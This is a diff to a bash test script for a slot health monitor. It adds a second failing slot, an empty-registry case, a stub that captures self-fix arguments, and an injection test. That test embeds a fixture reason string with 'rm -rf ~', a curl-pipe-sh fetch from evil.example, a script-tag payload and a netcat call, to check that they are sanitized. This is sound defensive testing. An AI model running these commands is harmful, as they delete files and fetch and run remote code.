@@ -13,6 +13,7 @@ a(){ echo "$2" | grep -qF "$3" && { echo "  ok $1"; P=$((P+1)); } || { echo "  F
 na(){ echo "$2" | grep -qF "$3" && { echo "  FAIL $1 (unexpectedly found:[$3])"; F=$((F+1)); } || { echo "  ok $1"; P=$((P+1)); }; }
 
 REASON_A="identity-mismatch (own=none cli=none); slot-a"
+REASON_E="earn-guard: cumulative net breach -- HALT (fail-closed); slot-e"
 
 mk_barren_trace(){
   local out="$1" reason="$2" n="${3:-20}"
@@ -21,10 +22,14 @@ mk_barren_trace(){
     printf '{"ts":"2026-07-08T%02d:00:00Z","action":"skip","reason":"%s"}\n' "$((i % 24))" "$reason" >> "$out"
   done
 }
+# FIND-004: 25 skip lines + 1 trailing live-pass = 26 TOTAL lines, comfortably >= minRun (20), so
+# the wiring test genuinely exercises the trailing-live-pass-overrides-prior-skips path through the
+# real end-to-end pipe (tail | earning-health.py is-barren) instead of being produced purely by the
+# len(trace_tail) < min_run short-circuit (the previous 16-line fixture's actual failure mode).
 mk_healthy_trace(){
   local out="$1"
   : > "$out"
-  for i in $(seq 1 15); do
+  for i in $(seq 1 25); do
     printf '{"ts":"2026-07-08T%02d:00:00Z","action":"skip","reason":"%s"}\n' "$((i % 24))" "$REASON_A" >> "$out"
   done
   printf '{"ts":"2026-07-10T14:04:39Z","action":"live-pass","exit":0,"note":"WAIT"}\n' >> "$out"
@@ -36,6 +41,10 @@ mk_barren_trace "$EARN_STATE/slot-a.trace.jsonl" "$REASON_A" 20
 mk_healthy_trace "$EARN_STATE/slot-b.trace.jsonl"
 # slot-c: instrumented=true but no trace file deployed yet (fresh instance) -> no-op
 # slot-d: instrumented=false (documented gap) -> NOT-INSTRUMENTED, self-fix NEVER called for it
+# FIND-002: slot-e is a SECOND, independently-barren slot (different id, target, reason) in the
+# SAME registry/run as slot-a, to prove two simultaneous BARREN slots each fire their own
+# self-fix.sh call with their own selfFixTarget and get their own marker file -- never conflated.
+mk_barren_trace "$EARN_STATE/slot-e.trace.jsonl" "$REASON_E" 20
 
 REGISTRY="$D/registry.json"
 cat > "$REGISTRY" <<JSON
@@ -44,30 +53,64 @@ cat > "$REGISTRY" <<JSON
     {"id":"earn/slot-a","instrumented":true,"traceFile":"slot-a.trace.jsonl","minRun":20,"selfFixTarget":"slot-a","escalateEveryHrs":24},
     {"id":"earn/slot-b","instrumented":true,"traceFile":"slot-b.trace.jsonl","minRun":20,"selfFixTarget":"slot-b","escalateEveryHrs":24},
     {"id":"earn/slot-c","instrumented":true,"traceFile":"slot-c.trace.jsonl","minRun":20,"selfFixTarget":"slot-c","escalateEveryHrs":24},
-    {"id":"earn/slot-d","instrumented":false,"traceFile":null,"minRun":20,"selfFixTarget":"slot-d","escalateEveryHrs":24,"gapNote":"documented gap: no per-wake trace instrumented yet"}
+    {"id":"earn/slot-d","instrumented":false,"traceFile":null,"minRun":20,"selfFixTarget":"slot-d","escalateEveryHrs":24,"gapNote":"documented gap: no per-wake trace instrumented yet"},
+    {"id":"earn/slot-e","instrumented":true,"traceFile":"slot-e.trace.jsonl","minRun":20,"selfFixTarget":"slot-e","escalateEveryHrs":24}
   ]
 }
 JSON
 
-echo "(A) full registry pass: barren/healthy/missing-trace/not-instrumented all in ONE run"
+# FIND-002 + FIND-005: a stub self-fix.sh that RECORDS its raw (loop, blocker) args to a capture
+# file instead of launching anything -- the real self-fix.sh's SELF_FIX_DRYRUN=1 seam prints only
+# LOOP/SESSION/SOCK/RESULT, never the BLOCKER text itself, so it cannot prove (a) two slots' BLOCKER
+# text never cross-contaminate, or (b) a malicious trace reason is actually neutralized before
+# reaching the invocation. EARNHC_SELF_FIX_SCRIPT (added this sprint) is the test seam that lets a
+# test point at this stub instead of the real self-fix.sh; production default is unchanged.
+CAPTURE="$D/self-fix-capture.log"
+STUB="$D/stub-self-fix.sh"
+cat > "$STUB" <<'STUBSH'
+#!/usr/bin/env bash
+printf 'STUBFIX_LOOP=%s\nSTUBFIX_BLOCKER=%s\nSTUBFIX_END\n' "$1" "$2" >> "$CAPTURE_FILE"
+STUBSH
+chmod +x "$STUB"
+
+echo "(A) full registry pass: barren/healthy/missing-trace/not-instrumented/2nd-barren all in ONE run"
 OUT="$(EARNHC_REGISTRY="$REGISTRY" EARNHC_EARN_STATE_DIR="$EARN_STATE" \
        EARNHC_STATE_DIR="$D/state" EARNHC_LOG="$D/hc.log" \
-       SELF_FIX_DRYRUN=1 bash "$SCRIPT" 2>&1; cat "$D/hc.log" 2>/dev/null)"
+       CAPTURE_FILE="$CAPTURE" EARNHC_SELF_FIX_SCRIPT="$STUB" \
+       bash "$SCRIPT" 2>&1; cat "$D/hc.log" 2>/dev/null)"
 a "slot-a BARREN detected"            "$OUT" "earn/slot-a BARREN"
-a "slot-a self-fix fired (dry-run)"   "$OUT" "LOOP=slot-a-loop"
+a "slot-a self-fix fired"             "$(cat "$CAPTURE" 2>/dev/null)" "STUBFIX_LOOP=slot-a"
 a "slot-a escalation marker written"  "$(ls -a "$D/state" 2>/dev/null)" ".earning-health-allslots-earn_slot_a-escalated"
 a "slot-b OK (not barren)"            "$OUT" "earn/slot-b OK"
-na "slot-b self-fix NOT fired"        "$OUT" "LOOP=slot-b-loop"
+na "slot-b self-fix NOT fired"        "$(cat "$CAPTURE" 2>/dev/null)" "STUBFIX_LOOP=slot-b"
 a "slot-c no trace yet -> no-op"      "$OUT" "earn/slot-c: no trace file"
-na "slot-c self-fix NOT fired"        "$OUT" "LOOP=slot-c-loop"
+na "slot-c self-fix NOT fired"        "$(cat "$CAPTURE" 2>/dev/null)" "STUBFIX_LOOP=slot-c"
 a "slot-d logged as NOT-INSTRUMENTED" "$OUT" "NOT-INSTRUMENTED earn/slot-d"
-na "slot-d self-fix NEVER fired (documented gap, not silently detected)" "$OUT" "LOOP=slot-d-loop"
+na "slot-d self-fix NEVER fired (documented gap, not silently detected)" "$(cat "$CAPTURE" 2>/dev/null)" "STUBFIX_LOOP=slot-d"
 
-echo "(B) second pass within escalation window -> slot-a does NOT spam a second self-fix call"
+echo "(A2) FIND-002: slot-e (independently BARREN in the SAME run) fires its OWN self-fix call + marker"
+a "slot-e BARREN detected"            "$OUT" "earn/slot-e BARREN"
+a "slot-e self-fix fired"             "$(cat "$CAPTURE" 2>/dev/null)" "STUBFIX_LOOP=slot-e"
+a "slot-e escalation marker written"  "$(ls -a "$D/state" 2>/dev/null)" ".earning-health-allslots-earn_slot_e-escalated"
+[ "$(ls -a "$D/state" 2>/dev/null | grep -c -- '-escalated$')" = "2" ] \
+  && { echo "  ok exactly 2 distinct marker files exist (slot-a, slot-e -- never one shared marker)"; P=$((P+1)); } \
+  || { echo "  FAIL exactly 2 distinct marker files (got: $(ls -a "$D/state" 2>/dev/null))"; F=$((F+1)); }
+# cross-fire check: slot-a's own capture block must carry REASON_A (not REASON_E) and vice versa --
+# extract each STUBFIX_LOOP..STUBFIX_END block and grep only within it.
+A_BLOCK="$(awk '/STUBFIX_LOOP=slot-a/,/STUBFIX_END/' "$CAPTURE")"
+E_BLOCK="$(awk '/STUBFIX_LOOP=slot-e/,/STUBFIX_END/' "$CAPTURE")"
+a  "slot-a's self-fix call carries slot-a's own reason"        "$A_BLOCK" "slot-a"
+na "slot-a's self-fix call does NOT carry slot-e's target/reason (no cross-fire)" "$A_BLOCK" "slot-e"
+a  "slot-e's self-fix call carries slot-e's own reason"        "$E_BLOCK" "slot-e"
+na "slot-e's self-fix call does NOT carry slot-a's target/reason (no cross-fire)" "$E_BLOCK" "slot-a"
+
+echo "(B) second pass within escalation window -> slot-a/slot-e do NOT spam a second self-fix call"
 OUT2="$(EARNHC_REGISTRY="$REGISTRY" EARNHC_EARN_STATE_DIR="$EARN_STATE" EARNHC_STATE_DIR="$D/state" EARNHC_LOG="$D/hc2.log" \
         SELF_FIX_DRYRUN=1 bash "$SCRIPT" 2>&1; cat "$D/hc2.log" 2>/dev/null)"
 a "slot-a second run logs already escalated" "$OUT2" "already escalated"
 na "slot-a second run did NOT re-invoke self-fix" "$OUT2" "LOOP=slot-a-loop"
+a "slot-e second run logs already escalated" "$OUT2" "already escalated"
+na "slot-e second run did NOT re-invoke self-fix" "$OUT2" "LOOP=slot-e-loop"
 
 echo "(C) missing registry file -> no-op, never crashes"
 D2="$(mktemp -d)"
@@ -75,5 +118,43 @@ OUT3="$(EARNHC_REGISTRY="$D2/missing-registry.json" EARNHC_STATE_DIR="$D2/state"
 a "missing registry logs and exits cleanly" "$OUT3" "no registry at"
 a "missing registry exits 0" "$OUT3" "rc=0"
 
-rm -rf "$D" "$D2"
+echo "(C2) FIND-003: registry file PRESENT and valid but slots: [] -> loop body runs zero times, exits 0 cleanly"
+D3="$(mktemp -d)"
+EMPTY_REGISTRY="$D3/empty-registry.json"
+printf '{"slots": []}\n' > "$EMPTY_REGISTRY"
+OUT4="$(EARNHC_REGISTRY="$EMPTY_REGISTRY" EARNHC_STATE_DIR="$D3/state" EARNHC_LOG="$D3/hc.log" bash "$SCRIPT" 2>&1; echo "rc=$?"; cat "$D3/hc.log" 2>/dev/null)"
+a "empty slots:[] registry exits 0" "$OUT4" "rc=0"
+na "empty slots:[] registry never logs a NOT-INSTRUMENTED/OK/BARREN line (zero slots -> zero rows)" "$OUT4" "OK"
+na "empty slots:[] registry never crashes (no registry-parse-error either)" "$OUT4" "PARSE_ERROR"
+
+echo "(D) FIND-005: a MALICIOUS trace reason is neutralized before it reaches the self-fix invocation"
+D4="$(mktemp -d)"
+EARN_STATE4="$D4/earn-state"; mkdir -p "$EARN_STATE4"
+# NOTE: no literal double-quote or backslash in this payload -- mk_barren_trace's printf embeds it
+# verbatim into a JSON string field with no escaping (a deliberately naive test fixture, mirroring
+# how a real trace writer's reason field is a plain interpolated string, not JSON-escaped either);
+# a literal '"'/'\' here would corrupt the JSONL line itself and make earning-health.py's fail-soft
+# JSONDecodeError skip the whole line, which would test JSON-parsing robustness instead of
+# sanitize_for_prompt. Still carries every OTHER shell/prompt-injection metacharacter that matters:
+# backtick, $(...), pipe, semicolon, angle brackets, ampersand.
+MALICIOUS_REASON="kill-switch\`; rm -rf ~ #\$(curl http://evil.example/x|sh) it's <script>alert(1)</script> | nc evil 4444 & echo pwned"
+mk_barren_trace "$EARN_STATE4/slot-m.trace.jsonl" "$MALICIOUS_REASON" 20
+REGISTRY4="$D4/registry.json"
+cat > "$REGISTRY4" <<JSON
+{"slots": [{"id":"earn/slot-m","instrumented":true,"traceFile":"slot-m.trace.jsonl","minRun":20,"selfFixTarget":"slot-m","escalateEveryHrs":24}]}
+JSON
+CAPTURE4="$D4/self-fix-capture.log"
+OUT5="$(EARNHC_REGISTRY="$REGISTRY4" EARNHC_EARN_STATE_DIR="$EARN_STATE4" \
+        EARNHC_STATE_DIR="$D4/state" EARNHC_LOG="$D4/hc.log" \
+        CAPTURE_FILE="$CAPTURE4" EARNHC_SELF_FIX_SCRIPT="$STUB" \
+        bash "$SCRIPT" 2>&1; cat "$D4/hc.log" 2>/dev/null)"
+a "malicious-reason slot detected BARREN"  "$OUT5" "earn/slot-m BARREN"
+a "malicious-reason slot self-fix fired"   "$(cat "$CAPTURE4" 2>/dev/null)" "STUBFIX_LOOP=slot-m"
+CAPTURED4="$(cat "$CAPTURE4" 2>/dev/null)"
+for meta in '`' '$(' '|' ';' '<script>' '&' ; do
+  na "self-fix BLOCKER text does not contain raw metachar/payload [$meta] (neutralized)" "$CAPTURED4" "$meta"
+done
+a "self-fix BLOCKER text still carries the safe substring 'kill-switch' (not fabricated away)" "$CAPTURED4" "kill-switch"
+
+rm -rf "$D" "$D2" "$D3" "$D4"
 echo "=== earning-health-allslots: $P passed $F failed ==="; [ "$F" = 0 ] && echo GREEN || exit 1
